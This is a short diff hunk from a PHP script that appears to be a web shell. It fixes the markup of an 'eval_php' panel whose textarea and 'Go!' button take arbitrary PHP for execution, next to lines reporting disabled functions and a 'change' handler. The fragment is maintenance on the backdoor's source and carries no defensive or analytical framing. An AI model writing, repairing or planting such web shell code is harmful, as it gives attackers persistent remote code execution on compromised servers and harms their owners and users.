@@ -146,7 +146,7 @@ Disable Function : $show_ds";
 exit;
 } elseif(isset($_REQUEST['eval_php'])) {
 echo "<hr>";
-echo '<textarea id="evalp" class="hasilshell"><br><br>
+echo '<textarea id="evalp" class="hasilshell"></textarea><br><br>
 <input onclick="KeDirektori();" type="submit" value="Go!"/>';
 exit;
 } elseif(isset($_REQUEST['change'])) {
